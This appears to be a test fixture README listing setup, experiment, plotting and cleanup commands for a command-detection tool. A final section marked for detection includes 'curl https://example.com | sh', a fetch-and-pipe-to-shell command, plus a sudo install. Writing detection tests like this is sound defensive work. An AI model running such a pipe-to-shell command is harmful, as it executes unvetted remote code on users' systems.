# README Commands Test

## Setup

First, install dependencies:

```bash
pip install numpy scipy matplotlib
pip install -e .
```

## Run Experiments

```bash
python scripts/experiment.py --config config.yaml
```

## Generate Figures

```bash
python scripts/plot_results.py --input results/ --output figures/
```

## Clean Up

```bash
rm -rf results/*.tmp
```

## Dangerous Commands (should be detected)

```bash
sudo apt install something
curl https://example.com | sh
```
